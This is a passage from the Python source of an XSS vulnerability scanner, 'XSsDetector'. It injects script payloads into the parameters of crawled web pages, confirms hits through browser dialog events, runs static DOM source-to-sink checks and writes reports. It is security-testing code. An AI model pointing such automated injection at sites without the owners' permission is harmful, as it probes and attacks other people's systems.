            'confidence_score': 10,
            'screenshot': screenshot_path,
            'reasons': [
                f"Confirmed XSS - Alert triggered with payload: {payload}",
                f"Alert content: {', '.join(alerts)}",
                f"Vulnerability type: {vuln_type}"
            ]
        }

        # Check if already recorded
        for existing in self.confirmed_vulnerabilities:
            if (existing['url'] == url and
                existing['payload'] == payload and
                existing['vulnerability_type'] == vuln_type):
                return

        self.confirmed_vulnerabilities.append(vulnerability)
        self.log.debug(
            f"Stored XSS confirmed (pending report): {url} — "
            f"payload: {payload[:60]} — alerts: {', '.join(alerts)}"
        )

    def _analyze_endpoint_only(self, endpoint: Dict[str, Any]) -> None:
        """Analyze endpoint without automated testing (fallback)"""
        # This is the original analysis method without Selenium testing
        # Keep for backward compatibility
        pass

    def _create_findings(self) -> list[Finding]:
        """Convert confirmed vulnerabilities to Finding objects"""
        findings = []

        for vuln in self.confirmed_vulnerabilities:
            finding = Finding(
                url=vuln['url'],
                method="POST" if vuln['vulnerability_type'] == "stored_xss" else "GET",
                param=vuln['affected_fields'][0] if vuln['affected_fields'] else "form_data",
                param_type="form" if vuln['vulnerability_type'] == "stored_xss" else "query",
                context="HTML_BODY",
                xss_type="Stored XSS",
                payload=vuln['payload'],
                confidence="CONFIRMED",
                confidence_score=100,
                evidence=f"Alert triggered: {', '.join(vuln['triggered_alerts'])} | URL: {vuln['url']}",
                severity="HIGH",
                impact="Stored XSS – may execute for every visitor if data is rendered unsafely",
                screenshot=vuln.get('screenshot')
            )
            findings.append(finding)

        return findings

# ─────────────────────────────────────────────────────────────────────────────
# DOM XSS analyser – enhanced to test ALL endpoints
# ─────────────────────────────────────────────────────────────────────────────
class DOMXSSAnalyser:
    """
    Analyses client-side routes, fragment-based inputs, and inline/external
    JS for source-to-sink flows. Also performs dynamic DOM XSS testing on all
    input parameters (query, fragment, form, etc.) using the browser validator.
    Confirmation: only Playwright dialog events (via BrowserValidator) produce
    confirmed findings — static source-to-sink detection is advisory only.

    NOTE ON TERMINAL OUTPUT: test_all_parameters() only logs progress and
    debug-level detail while it runs. The single, user-facing "confirmed
    vulnerability" box for each finding it discovers is printed exactly once
    by the orchestrator (XSsDetector.run) after this method returns, so a
    finding is never shown twice in the terminal.
    """

    DOM_SOURCES = [
        "location.search", "location.hash", "document.referrer",
        "window.name", "location.href", "document.URL",
        "document.documentURI", "document.baseURI",
    ]
    DOM_SINKS = [
        r"innerHTML\s*=",
        r"outerHTML\s*=",
        r"document\.write\s*\(",
        r"document\.writeln\s*\(",
        r"eval\s*\(",
        r"setTimeout\s*\(",
        r"setInterval\s*\(",
        r"Function\s*\(",
        r"\.src\s*=",
        r"\.href\s*=",
        r"location\s*=",
        r"location\.assign\s*\(",
        r"location\.replace\s*\(",
        r"insertAdjacentHTML\s*\(",
        r"\.setAttribute\s*\(",
    ]

    def __init__(self, http: HTTPClient, browser: BrowserValidator,
                 logger: Logger, snapshot_manager: SnapshotManager):
        self.http    = http
        self.browser = browser
        self.log     = logger
        self.snapshot_mgr = snapshot_manager

    def _fetch_js(self, base_url: str, body: str) -> str:
        scripts = re.findall(
            r'<script[^>]+src=["\']([^"\']+)["\']', body, re.IGNORECASE
        )
        combined = body
        for src in scripts[:5]:
            if src.startswith("//"):
                src = "https:" + src
            elif src.startswith("/"):
                parsed = urllib.parse.urlparse(base_url)
                src    = f"{parsed.scheme}://{parsed.netloc}{src}"
            elif not src.startswith("http"):
                continue
            r = self.http.get(src)
            if r:
                combined += f"\n/* external: {src} */\n" + r.text
        return combined

    def analyse_url(self, url: str) -> list[str]:
        """Static source-to-sink analysis for a single URL."""
        resp = self.http.get(url)
        if not resp:
            return []

        combined_js = self._fetch_js(url, resp.text)

        script_blocks = re.findall(
            r'<script[^>]*>(.*?)</script>', combined_js,
            re.DOTALL | re.IGNORECASE
        )
        js_text = "\n".join(script_blocks) + combined_js

        risks: list[str] = []
        for src in self.DOM_SOURCES:
            if src in js_text:
                for sink_pat in self.DOM_SINKS:
                    if re.search(sink_pat, js_text):
                        risks.append(
                            f"Source '{src}' → sink matching '{sink_pat}'"
                        )
        return risks

    def test_parameter_for_dom(self, ip: InputPoint, max_payloads: int = 5) -> Optional[Finding]:
        """
        Test a single input point with DOM-specific payloads using browser validation.
        Returns a Finding if a dialog event is triggered.
        """
        dom_payloads = PAYLOADS.get("DOM", [])
        if max_payloads > 0:
            dom_payloads = dom_payloads[:max_payloads]

        for payload in dom_payloads:
            # For fragment, the payload may already include '#' or not, but we handle via _build_url
            # Ensure we have a clean URL without fragment if param_type is fragment
            if ip.param_type == "fragment":
                # The _build_url method will add the payload as fragment
                pass
            # For other params, build URL with payload in appropriate position
            # Use the browser validator which handles all param types
            confirmed, evidence, screenshot, dom_snapshot = self.browser.validate(
                ip, payload, post_data=ip.post_body if ip.method == "POST" else None
            )
            if confirmed:
                return Finding(
                    url=ip.url,
                    method=ip.method,
                    param=ip.param,
                    param_type=ip.param_type,
                    context="DOM",
                    xss_type="DOM-Based XSS",
                    payload=payload,
                    confidence="CONFIRMED",
                    confidence_score=100,
                    evidence=evidence,
                    screenshot=screenshot,
                    dom_snapshot=dom_snapshot,
                    severity="HIGH",
                    impact="DOM-based XSS – client‑side script injection",
                )
        return None

    def test_all_parameters(self, input_points: List[InputPoint],
                            max_payloads_per_param: int = 5,
                            limit: int = 0) -> List[Finding]:
        """
        Test all input points for DOM XSS using browser validation.
        If `limit` > 0, only test that many parameters (to avoid excessive testing).
        """
        self.log.section("DOM-Based XSS Dynamic Testing (All Parameters)")
        findings = []

        # Filter out parameters that are unlikely to be DOM sources (e.g., headers, runtime)
        # But we can test all; we'll limit to a reasonable set.
        # We'll prioritise query, fragment, and form parameters.
        candidates = []
        for ip in input_points:
            if ip.param_type in ("query", "fragment", "form", "js"):
                candidates.append(ip)
        if limit > 0 and len(candidates) > limit:
            candidates = candidates[:limit]

        self.log.info(f"Testing {len(candidates)} parameters for DOM XSS (limit {limit})")

        for idx, ip in enumerate(candidates, 1):
            self.log.progress(idx, len(candidates), f"DOM test: {ip.param} ({ip.param_type}) @ {ip.url[:50]}")
            finding = self.test_parameter_for_dom(ip, max_payloads_per_param)
            if finding:
                findings.append(finding)
                self.log.debug(
                    f"DOM XSS confirmed (pending report): {finding.param} "
                    f"({finding.param_type}) @ {finding.url[:60]}"
                )

        self.log.progress_done()
        self.log.success(f"DOM XSS testing complete: {len(findings)} confirmed finding(s)")
        return findings

    # Legacy method for fragment-only testing (kept for compatibility)
    def test_fragment_payloads(self, ip: InputPoint) -> Optional[Finding]:
        """Legacy: test fragment payloads for a single InputPoint."""
        return self.test_parameter_for_dom(ip, max_payloads=5)

# ─────────────────────────────────────────────────────────────────────────────
# CSP detector
# ─────────────────────────────────────────────────────────────────────────────
def detect_csp(response_headers: dict) -> bool:
    for h in [
        "Content-Security-Policy",
        "Content-Security-Policy-Report-Only",
        "X-Content-Security-Policy",
    ]:
        if h in response_headers:
            return True
    return False

# ─────────────────────────────────────────────────────────────────────────────
# Report generator
# ─────────────────────────────────────────────────────────────────────────────
class ReportGenerator:
    """
    Renders the final results.

    Terminal summary (print_summary): every free-text field (URL, payload,
    evidence) is truncated with Logger._truncate_line() so each finding
    always fits on a single, readable terminal line.

    File reports (save_json / save_text): always contain the FULL,
    untruncated payload/evidence/url text — truncation only ever affects
    what is shown in the terminal.
    """

    def __init__(self, findings: list[Finding], target: str, logger: Logger):
        self.findings = findings
        self.target   = target
        self.log      = logger

    def print_summary(self):
        self.log.section("Scan Results — Confirmed Findings Only")

        total = len(self.findings)
        if total == 0:
            self.log.info(green("No confirmed XSS vulnerabilities detected."))
            return

        print(f"\n  {bold('Target:')}  {self.target}")
        print(f"  {bold('Total:')}   {red(str(total))} confirmed finding(s)")
        print()

        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        sorted_findings = sorted(
            self.findings,
            key=lambda f: sev_order.get(f.severity, 9)
        )

        rule = "─" * LINE_WIDTH
        trunc = self.log._truncate_line

        for i, f in enumerate(sorted_findings, 1):
            badge = xss_type_badge(f.xss_type)
            sev   = (
                red(f.severity)
                if f.severity in ("CRITICAL", "HIGH")
                else yellow(f.severity)
            )
            url_ln      = trunc(f.url, 60)
            payload_ln  = trunc(f.payload, 60)
            evidence_ln = trunc(f.evidence, 60)

            print(f"  {dim(rule)}")
            print(f"  {bold(f'[{i}]')} {badge}  {bold(f.param)} {dim(f'({f.param_type})')}")
            print(f"      {bold('URL:')}       {url_ln}")
            print(f"      {bold('Context:')}   {context_label(f.context)}")
            print(f"      {bold('Payload:')}   {dim(payload_ln)}")
            print(f"      {bold('Evidence:')}  {dim(evidence_ln)}")
            print(f"      {bold('Severity:')}  {sev}   {dim(f'Score: {f.confidence_score}/100')}")
            if f.screenshot:
                print(f"      {bold('Proof:')}     {f.screenshot}")
            if f.dom_snapshot:
                print(f"      {bold('DOM Snap:')}  {f.dom_snapshot}")
        print(f"  {dim(rule)}\n")

    def save_json(self, path: str):
        output = {
            "meta": {
                "tool":      "XSsDetector",
                "target":    self.target,
                "timestamp": datetime.datetime.now(
                    datetime.timezone.utc
                ).isoformat(),
                "note": (
                    "Only browser-confirmed findings are included. "
                    "Confirmation gate: Playwright dialog event (alert/confirm/prompt)."
                ),
            },
            "summary": {
                "total":     len(self.findings),
                "confirmed": len(self.findings),
                "critical":  sum(1 for f in self.findings
                                 if f.severity == "CRITICAL"),
                "high":      sum(1 for f in self.findings
                                 if f.severity == "HIGH"),
                "reflected": sum(1 for f in self.findings
                                 if f.xss_type == "Reflected XSS"),
                "stored":    sum(1 for f in self.findings
                                 if f.xss_type == "Stored XSS"),
                "dom_based": sum(1 for f in self.findings
                                 if f.xss_type == "DOM-Based XSS"),
            },
            "findings": [
                {
                    # Full, untruncated fields — the terminal-only
                    # truncation applied by print_summary() never touches
                    # what is written to this report.
                    "url":              f.url,
                    "method":           f.method,
                    "param":            f.param,
                    "param_type":       f.param_type,
                    "context":          f.context,
                    "context_label":    context_label(f.context),
                    "xss_type":         f.xss_type,
                    "payload":          f.payload,
                    "confidence":       f.confidence,
                    "confidence_score": f.confidence_score,
                    "evidence":         f.evidence,
                    "screenshot":       f.screenshot,
                    "dom_snapshot":     f.dom_snapshot,
                    "severity":         f.severity,
                    "impact":           f.impact,
                    "timestamp":        f.timestamp,
                }
                for f in self.findings
            ],
        }
        with open(path, "w", encoding="utf-8") as fp:
            json.dump(output, fp, indent=2)
        self.log.success(f"JSON report → {bold(path)}")

    def save_text(self, path: str):
        lines = [
            "=" * 70,
            "  XSsDetector Report — Confirmed Findings Only",
            f"  Target:    {self.target}",
            f"  Generated: {datetime.datetime.now(datetime.timezone.utc).isoformat()}",
            f"  Total confirmed findings: {len(self.findings)}",
            "=" * 70,
        ]
        for i, f in enumerate(self.findings, 1):
            # Full, untruncated fields in the text report.
            lines += [
                "",
                f"[{i}] {f.xss_type} – {f.param} @ {f.url}",
                f"    Method:     {f.method}",
                f"    Param Type: {f.param_type}",
                f"    XSS Type:   {f.xss_type}",
                f"    Context:    {context_label(f.context)}",
                f"    Payload:    {f.payload}",
                f"    Evidence:   {f.evidence}",
                f"    Severity:   {f.severity}",
                f"    Impact:     {f.impact}",
                f"    Score:      {f.confidence_score}/100",
            ]
            if f.screenshot:
                lines.append(f"    Screenshot: {f.screenshot}")
            if f.dom_snapshot:
                lines.append(f"    DOM Snapshot: {f.dom_snapshot}")
        lines.append("\n" + "=" * 70)
        with open(path, "w", encoding="utf-8") as fp:
            fp.write("\n".join(lines))
        self.log.success(f"Text report → {bold(path)}")

# ─────────────────────────────────────────────────────────────────────────────
# Master orchestrator
# ─────────────────────────────────────────────────────────────────────────────
class XSsDetector:
    """
    Main orchestrator – ties all components together and drives the
    full detection workflow.

    Confirmation policy (zero false positives):
      A finding is recorded for ALL XSS types (Reflected, Stored, DOM-Based)
      IF AND ONLY IF BrowserValidator.validate() returns confirmed=True, which
      happens only when Playwright fires a dialog event (alert/confirm/prompt/
      beforeunload).  No other signal — heuristic score, payload reflection,
      console events, DOM presence, or event-handler attributes — can produce
      a recorded finding.

    Single-print policy (no duplicate terminal output):
      `self.log.finding_box(...)` is called from EXACTLY ONE place for each
      XSS type — here, in run() — and only after `_add_finding()` confirms
      the finding is new (not a duplicate already recorded). The scanning
      components (StoredXSSChecker, DOMXSSAnalyser) never print a finding
      box themselves; they only log at debug level while scanning, so a
      confirmed vulnerability is always shown to the user exactly once.
    """

    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.log  = Logger(
            verbose=args.verbose,
            log_file=args.log_file if hasattr(args, "log_file") else None,
        )
        self.findings:       list[Finding] = []
        self._seen_findings: set[str]      = set()

    # ------------------------------------------------------------------
    def _add_finding(self, finding: Finding) -> bool:
        dedup_key = (
            f"{finding.url}|{finding.param}|"
            f"{finding.param_type}|{finding.payload}"
        )
        if dedup_key in self._seen_findings:
            self.log.debug(f"Duplicate finding skipped: {dedup_key[:80]}")
            return False
        self._seen_findings.add(dedup_key)
        self.findings.append(finding)
        return True

    # ------------------------------------------------------------------
    def _announce_finding(self, finding: Finding) -> None:
        """Print the single, canonical confirmation box for a finding."""
        self.log.finding_box(
            xss_type=finding.xss_type,
            param=finding.param,
            param_type=finding.param_type,
            url=finding.url,
            context=finding.context,
            payload=finding.payload,
            evidence=finding.evidence,
            severity=finding.severity,
        )

    # ------------------------------------------------------------------
    def _build_auth_headers(self) -> dict:
        headers: dict = {}
        if hasattr(self.args, "cookie") and self.args.cookie:
            headers["Cookie"] = self.args.cookie
        if hasattr(self.args, "auth_header") and self.args.auth_header:
            for hdr in self.args.auth_header:
                if ":" in hdr:
                    k, v = hdr.split(":", 1)
                    headers[k.strip()] = v.strip()
        return headers

    # ------------------------------------------------------------------
    def run(self):
        self._print_banner()

        # ── 1. Load and parse spider JSON ──────────────────────────────
        parser = SpiderParser(self.args.input, self.log)
        if not parser.load():
            sys.exit(1)

        input_points = parser.parse()
        target_base  = parser.get_target_base()
        resp_headers = parser.get_response_headers()
        csp_present  = detect_csp(resp_headers)
        all_urls     = parser.get_all_urls()
        spider_data  = parser.data

        if csp_present:
            self.log.warning(
                "CSP header detected — switching to CSP-bypass payloads"
            )

        # ── 2. Build auth headers; attach to every input point ─────────
        auth_headers = self._build_auth_headers()
        if auth_headers:
            self.log.info(
                f"Auth headers loaded: {', '.join(auth_headers.keys())}"
            )
            for ip in input_points:
                ip.extra_headers.update(auth_headers)

        # ── 3. Playwright availability probe ───────────────────────────
        browser_available = False
        if not self.args.no_browser:
            self.log.info(
                "Probing Playwright / Chromium availability …"
            )
            browser_available = probe_playwright(self.log)
            if browser_available:
                self.log.success("Browser confirmation available")
            else:
                self.log.warning(
                    "Playwright / Chromium not usable — "
                    "browser confirmation disabled automatically"
                )
        else:
            self.log.warning(
                "Browser validation disabled (--no-browser). "
                "No findings can be confirmed."
            )

        # ── 4. HTTP client ─────────────────────────────────────────────
        http = HTTPClient(
            timeout=self.args.timeout,
            delay=self.args.delay,
            headers=auth_headers,
            logger=self.log,
        )

        # ── 5. Create SnapshotManager ──────────────────────────────────
        snapshot_mgr = SnapshotManager(self.args.screenshot_dir)

        # ── 6. Validate endpoints & confirm reflection ─────────────────
        validator = EndpointValidator(http, self.log)

        if self.args.skip_validation:
            self.log.warning(
                "Endpoint validation skipped (--skip-validation)"
            )
            injectable = input_points
        else:
            injectable, _ = validator.validate_batch(
                input_points, threads=self.args.threads
            )

        if not injectable:
            self.log.warning("No injectable parameters found. Exiting.")
            self._finish(target_base)
            return

        # ── 7. Supporting components ───────────────────────────────────
        filter_analyser  = FilterAnalyser(http, self.log)
        context_detector = ContextDetector()
        payload_selector = PayloadSelector()
        scorer           = HeuristicScorer()
        browser          = BrowserValidator(
            logger=self.log,
            snapshot_manager=snapshot_mgr,
            timeout=self.args.browser_timeout,
            auth_headers=auth_headers,
        )

        # ── 8. Main reflected XSS testing loop ────────────────────────
        self.log.section("Reflected XSS Detection")

        total_params = len(injectable)
        for idx, ip in enumerate(injectable, 1):
            self.log.progress(
                idx, total_params,
                f"{ip.method} {ip.param} ({ip.param_type}) "
                f"@ {ip.url[:50]}"
            )

            # 8a. Character filter analysis
            char_filter = filter_analyser.analyse(ip)

            # 8b. Determine reflection type from filter results
            ip.reflection_type = FilterAnalyser.determine_reflection_type(
                char_filter, marker_reflected=bool(ip.reflected_body)
            )
            self.log.debug(
                f"Reflection type: {ip.reflection_type.value}  "
                f"for param {ip.param}"
            )

            # 8c. Establish context via fresh marker injection
            marker    = MARKER_TEMPLATE.format(
                uid=uuid.uuid4().hex[:8].upper()
            )
            parsed    = urllib.parse.urlparse(ip.url)
            clean_url = urllib.parse.urlunparse(
                parsed._replace(query="", fragment="")
            )

            if ip.param_type == "header":
                ctx_resp = http.get(
                    clean_url,
                    extra_headers={**ip.extra_headers, ip.param: marker}
                )
            elif ip.param_type in ("query", "runtime", "js"):
                ctx_resp = http.get(
                    clean_url, params={ip.param: marker},
                    extra_headers=ip.extra_headers
                )
            elif ip.param_type == "form" and ip.method == "POST":
                ctx_body = deepcopy(ip.post_body)
                ctx_body[ip.param] = marker
                ctx_resp = http.post(
                    clean_url, data=ctx_body,
                    extra_headers=ip.extra_headers
                )
            else:
                ctx_resp = http.get(
                    clean_url, params={ip.param: marker},
                    extra_headers=ip.extra_headers
                )

            context = (
                context_detector.detect(
                    ctx_resp.text, marker,
                    baseline=ip.baseline_body
                )
                if ctx_resp else "HTML_BODY"
            )

            # 8d. Select context-aware, filter-aware payloads
            payloads = payload_selector.select(
                context, char_filter,
                csp_present=csp_present,
                max_payloads=self.args.max_payloads,
            )
            self.log.debug(
                f"Context: {context}  |  {len(payloads)} payloads  "
                f"|  CSP: {csp_present}"
            )

            # 8e. Test each payload
            for payload in payloads:
                self.log.debug(f"Testing: {payload[:70]}")

                if ip.param_type == "header":
                    resp = http.get(
                        clean_url,
                        extra_headers={
                            **ip.extra_headers, ip.param: payload
                        }
                    )
                elif ip.param_type in ("query", "runtime", "js"):
                    resp = http.get(
                        clean_url, params={ip.param: payload},
                        extra_headers=ip.extra_headers
                    )
                elif ip.param_type == "form" and ip.method == "POST":
                    pbody = deepcopy(ip.post_body)
                    pbody[ip.param] = payload
                    resp = http.post(
                        clean_url, data=pbody,
                        extra_headers=ip.extra_headers
                    )
                else:
                    resp = http.get(
                        clean_url, params={ip.param: payload},
                        extra_headers=ip.extra_headers
                    )

                if resp is None:
                    continue

                payload_reflected = (
                    payload in resp.text
                    or urllib.parse.unquote(payload) in resp.text
                )

                # 8f. Heuristic score (used only to filter browser test
                #     candidates — never to record a finding directly)
                score = scorer.score(
                    context=context,
                    payload=payload,
                    char_filter=char_filter,
                    response_body=resp.text,
                    payload_in_response=payload_reflected,
                    csp_present=csp_present,
                    reflection_type=ip.reflection_type,
                )
                self.log.debug(
                    f"Score: {score}  reflected: {payload_reflected}"
                )

                if score < self.args.min_score:
                    continue

                # 8g. Browser confirmation — MANDATORY gate for all findings
                #     Only a Playwright dialog event sets confirmed=True.
                confirmed    = False
                evidence     = (
                    f"Score={score}, reflected={payload_reflected}, "
                    f"reflection_type={ip.reflection_type.value}"
                )
                screenshot   = None
                dom_snapshot = None

                if browser_available and not self.args.no_browser:
                    self.log.progress(
                        idx, total_params,
                        f"Browser validating {ip.param} "
                        f"(score={score})"
                    )
                    post_data = None
                    if ip.method == "POST":
                        post_data = deepcopy(ip.post_body)
                        post_data[ip.param] = payload

                    confirmed, br_evidence, screenshot, dom_snapshot = \
                        browser.validate(ip, payload, post_data)
                    if br_evidence:
                        evidence += f" | Browser: {br_evidence}"

                # 8h. Record ONLY dialog-confirmed findings, and print the
                #      single canonical confirmation box exactly once.
                if confirmed:
                    finding = Finding(
                        url=ip.url, method=ip.method, param=ip.param,
                        param_type=ip.param_type, context=context,
                        xss_type="Reflected XSS",
                        payload=payload, confidence="CONFIRMED",
                        confidence_score=100, evidence=evidence,
                        screenshot=screenshot,
                        dom_snapshot=dom_snapshot,
                    )
                    self.log.progress_done()
                    if self._add_finding(finding):
                        self._announce_finding(finding)
                    break  # move to next input point

        self.log.progress_done()

        # ── 9. Stored XSS checks using Selenium-based testing ─────────
        stored_scanner = StoredXSSChecker(
            spider_data, self.log, http,
            snapshot_manager=snapshot_mgr,
            headless=not self.args.no_headless if hasattr(self.args, "no_headless") else True,
        )
        stored_findings = stored_scanner.scan()

        # Each Stored XSS finding is printed exactly once here — the
        # scanner itself only logs progress at debug level while running.
        for finding in stored_findings:
            if self._add_finding(finding):
                self._announce_finding(finding)

        # ── 10. DOM XSS analysis ────────────────────────────────────────
        self.log.section("DOM-Based XSS Detection")

        # 10a. Static analysis for source-to-sink flows on all unique URLs
        dom_analyser = DOMXSSAnalyser(http, browser, self.log, snapshot_mgr)
        unique_urls  = list(
            dict.fromkeys(ip.url for ip in injectable)
        )

        self.log.info(
            f"Analysing {min(self.args.dom_limit, len(unique_urls))} "
            f"URL(s) for static source-to-sink flows"
        )
        risk_count = 0
        for url in unique_urls[:self.args.dom_limit]:
            risks = dom_analyser.analyse_url(url)
            for risk in risks:
                risk_count += 1
                self.log.warning(
                    f"DOM risk (static, unconfirmed): {url[:60]} — {risk}"
                )
        if risk_count == 0:
            self.log.info(
                "No source-to-sink flows detected in reachable pages"
            )

        # 10b. Dynamic DOM XSS testing on all parameters (not just fragments)
        # We test all input points that are likely DOM sources (query, fragment, form, js)
        dom_test_limit = getattr(self.args, 'dom_test_limit', 20)  # default 20
        if browser_available and not self.args.no_browser:
            self.log.info(
                f"Performing dynamic DOM XSS testing on up to {dom_test_limit} parameters"
            )
            dom_findings = dom_analyser.test_all_parameters(
                injectable,
                max_payloads_per_param=self.args.max_payloads or 5,
                limit=dom_test_limit
            )
            # Each DOM-Based XSS finding is printed exactly once here — the
            # analyser itself only logs progress at debug level while running.
            for finding in dom_findings:
                if self._add_finding(finding):
                    self._announce_finding(finding)
        else:
            self.log.info(
                "Dynamic DOM XSS testing skipped (browser not available or disabled)"
            )

        # ── 11. Finish ─────────────────────────────────────────────────
        self._finish(target_base)

    # ------------------------------------------------------------------
    def _deduplicate_findings(self):
        seen:   set[str]      = set()
        unique: list[Finding] = []
        for f in self.findings:
            key = f"{f.url}|{f.param}|{f.param_type}|{f.payload}"
            if key not in seen:
                seen.add(key)
                unique.append(f)
        self.findings = unique

    # ------------------------------------------------------------------
    def _finish(self, target: str):
        self._deduplicate_findings()

        reporter = ReportGenerator(self.findings, target, self.log)
        reporter.print_summary()

        if self.args.output_json:
            reporter.save_json(self.args.output_json)
        if self.args.output_txt:
            reporter.save_text(self.args.output_txt)

        self.log.close()

        total = len(self.findings)
        if total > 0:
            reflected = sum(
                1 for f in self.findings
                if f.xss_type == "Reflected XSS"
            )
            stored    = sum(
                1 for f in self.findings
                if f.xss_type == "Stored XSS"
            )
            dom_based = sum(
                1 for f in self.findings
                if f.xss_type == "DOM-Based XSS"
            )
            print(
                f"\n  {red(bold(f'{total} confirmed vulnerability(ies) found'))}"
            )
            parts = []
            if reflected:
                parts.append(f"{reflected} Reflected")
            if stored:
                parts.append(f"{stored} Stored")
            if dom_based:
                parts.append(f"{dom_based} DOM-Based")
            if parts:
                print(f"  {dim('Breakdown: ' + ', '.join(parts))}")
            print()
        else:
            print(
                f"\n  {green('Scan complete — no confirmed vulnerabilities found')}\n"
            )

    # ------------------------------------------------------------------
    def _print_banner(self):
        rule = "─" * LINE_WIDTH
        print(f"\n  {C_BOLD}{rule}{C_RESET}")
        print(
            f"  {bold('XSsDetector')}  "
            f"{dim('rule-based XSS detection — dialog-confirmed only')}"
        )
        print(f"  {C_BOLD}{rule}{C_RESET}")
        self.log.info(f"Input:       {bold(self.args.input)}")
        self.log.info(
            f"Delay:       {self.args.delay}s   "
            f"Timeout: {self.args.timeout}s   "
            f"Threads: {self.args.threads}"
        )
        self.log.info(
            f"Min score:   {self.args.min_score}   "
            f"Max payloads: {self.args.max_payloads or 'unlimited'}"
        )
        if not self.args.no_browser:
            self.log.info(
                f"Browser:     enabled  "
                f"(timeout: {self.args.browser_timeout}ms)"
            )
        else:
            self.log.info(
                "Browser:     disabled — no findings can be confirmed"
            )
        auth_h = self._build_auth_headers()
        if auth_h:
            self.log.info(f"Auth:        {', '.join(auth_h.keys())}")

# ─────────────────────────────────────────────────────────────────────────────
# CLI entry point
# ─────────────────────────────────────────────────────────────────────────────
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="XSsDetector",
        description=(
            "Rule-based XSS vulnerability detection module.\n"
            "Consumes a Hellhound Spider JSON file and identifies reflected,\n"
            "stored, and DOM-based XSS vulnerabilities.\n"
            "Only browser dialog-confirmed findings are reported."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    p.add_argument(
        "input",
        metavar="SPIDER_JSON",
        help="Path to the Hellhound Spider JSON output file",
    )

    # ── Output ─────────────────────────────────────────────────────────
    out = p.add_argument_group("Output")
    out.add_argument(
        "-o", "--output-json", metavar="FILE",
        default="xssdetector_report.json",
        help="JSON report path (default: xssdetector_report.json)",
    )
    out.add_argument(
        "-t", "--output-txt", metavar="FILE",
        default="xssdetector_report.txt",
        help="Text report path (default: xssdetector_report.txt)",
    )
    out.add_argument(
        "--screenshot-dir", metavar="DIR",
        default="xssdetector_screenshots",
        help="Screenshot directory (default: xssdetector_screenshots/)",
    )
    out.add_argument(
        "--log-file", metavar="FILE", default=None,
        help="Write log output to file",
    )
    out.add_argument(
        "-v", "--verbose", action="store_true",
        help="Enable verbose/debug output",
    )

    # ── Request tuning ─────────────────────────────────────────────────
    req = p.add_argument_group("Request tuning")
    req.add_argument(
        "--timeout", type=int, default=10,
        help="HTTP timeout in seconds (default: 10)",
    )
    req.add_argument(
        "--delay", type=float, default=0.2,
        help="Delay between requests in seconds (default: 0.2)",
    )
    req.add_argument(
        "--threads", type=int, default=5,
        help="Concurrent threads for validation phase (default: 5)",
    )

    # ── Authentication / session ────────────────────────────────────────
    auth = p.add_argument_group("Authentication")
    auth.add_argument(
        "--cookie", metavar="COOKIE_STRING", default=None,
        help="Session cookie string (e.g. 'session=abc123; csrf=xyz')",
    )
    auth.add_argument(
        "--auth-header", metavar="HEADER", action="append", default=[],
        dest="auth_header",
        help=(
            "Extra auth header in 'Name: Value' format "
            "(repeatable, e.g. --auth-header 'Authorization: Bearer TOKEN')"
        ),
    )

    # ── Detection options ───────────────────────────────────────────────
    det = p.add_argument_group("Detection options")
    det.add_argument(
        "--min-score", type=int, default=40,
        help="Minimum heuristic score to attempt browser confirmation "
             "(default: 40)",
    )
    det.add_argument(
        "--max-payloads", type=int, default=0,
        help="Max payloads to try per parameter, 0 = unlimited (default: 0)",
    )
    det.add_argument(
        "--browser-timeout", type=int, default=8000,
        help="Playwright timeout in ms (default: 8000)",
    )
    det.add_argument(
        "--no-browser", action="store_true",
        help="Disable browser confirmation "
             "(no findings can be confirmed)",
    )
    det.add_argument(
        "--skip-validation", action="store_true",
        help="Skip endpoint validation phase",
    )
    det.add_argument(
        "--dom-limit", type=int, default=10,
        help="Max URLs for static DOM source-to-sink analysis (default: 10)",
    )
    det.add_argument(
        "--dom-test-limit", type=int, default=20,
        help="Max parameters to test for dynamic DOM XSS (default: 20)",
    )
    det.add_argument(
        "--no-headless", action="store_true",
        help="Show browser window during stored XSS testing (not headless)",
    )

    return p


def main():
    parser = build_parser()
    args   = parser.parse_args()

    if not os.path.isfile(args.input):
        print(f"  {red('✗')} File not found: {args.input}")
        sys.exit(1)

    detector = XSsDetector(args)
    detector.run()


if __name__ == "__main__":
    main()
